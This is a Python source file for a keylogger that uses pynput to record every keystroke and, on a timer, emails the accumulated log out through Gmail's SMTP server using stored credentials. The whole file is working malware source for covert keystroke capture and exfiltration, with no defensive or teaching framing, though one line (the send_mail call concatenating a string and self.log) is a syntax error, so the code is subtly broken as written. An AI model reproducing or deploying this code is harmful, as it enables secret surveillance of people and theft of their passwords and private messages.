#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def process_key_press(self, key):
         try:
             # key.char print character without 'u'
             current_key = str(key.char)
         except AttributeError:
             if key == key.space:
                 current_key = " "
             else:
                 current_key = " "+ str(key) + " "
         self.append_to_log(current_key)
         print(key)

    def append_to_log(self, string):
        self.log = self.log + string

    def report(self):
         print(self.log)
         self.send_mail(self.email, self.password, "\n\n"self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # listen for each keystroke from the keyboard
    # and process_key_press is the callback function fo each pressed key
    def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
             keyboard_listener.join() # to start the keylogger

